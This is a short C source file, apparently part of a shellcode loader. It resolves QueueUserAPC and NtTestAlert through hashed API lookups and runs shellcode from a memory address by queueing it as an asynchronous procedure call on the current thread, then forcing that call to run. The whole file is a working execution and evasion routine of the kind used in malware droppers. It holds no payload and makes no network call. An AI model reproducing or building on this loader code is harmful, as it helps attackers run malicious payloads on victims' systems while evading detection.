#include "../../../includes/memory/memory.h"
#include "../../../includes/apis/apis.h"
#include "../../../includes/apis/apidefs.h"
#include "../../../includes/execution/execution.h"



BOOL execution_load_apis() {
	apis->QueueUserAPC = (pQueueUserAPC)GetProc(apis->modules.kernel32, HASHED_QUEUEUSERAPC);
	apis->NtTestAlert = (pNtTestAlert)GetProc(apis->modules.ntdll, HASHED_NTTESTALERT);
	return TRUE;
}


BOOL execution_run(MemoryInfo memInfo) {
	HANDLE hThread = GetCurrentThread();

	if (!apis->QueueUserAPC((PAPCFUNC)memInfo.ShellCodeAddress, hThread, NULL)) {
		return FALSE;
	}

	apis->NtTestAlert();

	return TRUE;
}